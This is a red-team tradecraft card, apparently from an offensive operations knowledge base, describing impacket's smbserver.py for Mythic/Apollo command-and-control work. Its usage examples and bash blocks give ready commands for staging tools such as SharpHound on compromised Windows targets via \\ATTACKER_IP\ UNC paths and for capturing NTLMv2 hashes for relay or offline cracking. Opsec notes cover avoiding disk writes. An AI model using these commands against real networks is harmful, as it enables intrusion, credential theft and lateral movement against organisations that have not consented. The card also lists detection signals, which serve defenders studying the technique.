---
name: impacket-smbserver
category: command-and-control
subcategories: [file-staging, ntlm-capture, smb-infrastructure]
tradecraft_tags: [smb-server, file-staging, ntlm-capture, impacket, python, infrastructure]
mitre_attack:
  - id: T1187
    name: Forced Authentication
  - id: T1105
    name: Ingress Tool Transfer
source:
  url: https://github.com/fortra/impacket
  license: Apache-2.0
  maintained: true
binary_type: python-script
binary_filename: smbserver.py
supported_os: [linux]
architecture: [x64]
privilege_required: none
network_required: true
detection_signal: |
  SMB server on a non-standard host (attacker IP rather than domain file server)
  is detectable by network monitoring. NTLM authentication events flowing to the
  attacker's IP rather than a DC appear anomalous. File access from the attacker's
  SMB share shows up in Sysmon network events.
usage_examples:
  - description: Start an SMB file server for tool staging
    args: "smbserver.py SHARENAME /path/to/files"
  - description: SMB server with NTLM capture (captures auth from any connecting client)
    args: "smbserver.py -smb2support SHARENAME /tmp/stage/"
  - description: Stage a file on the SMB share and access from target
    args: "(target) copy \\\\ATTACKER_IP\\SHARENAME\\tool.exe C:\\Windows\\Temp\\"
  - description: Execute directly from UNC path (staging without disk write)
    args: "(target) \\\\ATTACKER_IP\\SHARENAME\\SharpHound.exe -c All --ZipFilename out.zip"
opsec_notes: |
  Running an SMB server on the attacker machine is useful for two distinct purposes:
  1. **File staging**: serve tools to target machines without uploading to Mythic first
  2. **NTLM capture**: any machine that accesses the share authenticates via NTLM —
     the hash is captured for relay or offline use
  The UNC-path execution trick is operationally valuable: `\\ATTACKER\share\tool.exe`
  runs a tool without writing it to disk on the target. However, SMB connections to
  an unusual IP are highly detectable.
gotchas: |
  Python-only — attacker infrastructure. Target must be able to reach the attacker's
  IP on TCP 445 (SMB). Many corporate networks block outbound SMB (TCP 445) to
  non-internal hosts. For Mythic-based operations, uploading tools via Mythic's
  file store and using Apollo's download command is preferred over external SMB staging.
  UNC-path execution is still "running from disk" in terms of network traffic — the
  tool bytes traverse the network, just not written to local disk.
related_ttps: [ntlmrelayx, responder, crackmapexec, pass-the-hash]
alternatives: [mythic-file-upload, sharefile-via-http, webdav-staging]
common_args:
  sharename:
    description: SMB share name to expose
    typical_values: ["TOOLS", "SHARE", "FILES"]
    required: true
  path:
    description: Local path to serve via SMB
    typical_values: ["/tmp/tools/", "/opt/stage/"]
    required: true
  -smb2support:
    description: Enable SMBv2 support (required for modern Windows clients)
    typical_values: [flag-only]
last_updated: 2026-05-29
---

# impacket-smbserver

impacket's `smbserver.py` — starts a lightweight SMB server on the attacker machine
for file staging or NTLM capture. Enables serving tool files via UNC path to compromised
targets (no disk write via Mythic upload needed) and captures NTLM authentication from
any client that connects.

## File Staging Workflow

```bash
# Attacker side:
mkdir /tmp/stage
cp SharpHound.exe Rubeus.exe Seatbelt.exe /tmp/stage/
smbserver.py -smb2support TOOLS /tmp/stage/

# Target side (Apollo shell command):
cmd /c \\ATTACKER_IP\TOOLS\SharpHound.exe -c All --ZipFilename out.zip
```

## NTLM Capture via SMB

Any Windows machine that authenticates to the SMB server sends an NTLMv2 hash.
Combine with ntlmrelayx for relay, or capture for offline processing:
```bash
smbserver.py -smb2support SHARE /tmp/ 2>&1 | tee smb.log
# Log will contain NTLMv2 hashes from connecting clients
```

## Apollo-specific note
Python/Linux only. For Mythic-based operations, Apollo's built-in file transfer
(Mythic upload → Apollo download) is preferred. Use smbserver.py when direct
file staging from attacker infrastructure is needed without going through Mythic.
